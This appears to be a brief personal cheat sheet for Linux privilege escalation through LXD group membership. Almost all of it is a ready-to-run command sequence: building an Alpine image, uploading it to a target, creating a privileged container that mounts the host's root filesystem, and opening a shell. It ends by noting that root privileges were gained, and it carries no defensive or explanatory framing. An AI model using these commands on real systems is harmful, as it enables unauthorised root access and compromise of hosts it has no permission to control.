# lxd Privilege Esc

1. git clone https://github.com/saghul/lxd-alpine-builder.git  
cd lxd-alpine-builder  
sudo ./build-alpine  

2. upload it to target machine

3. lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myalpine
lxc image list
lxc init myalpine ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

--> gained root privs.
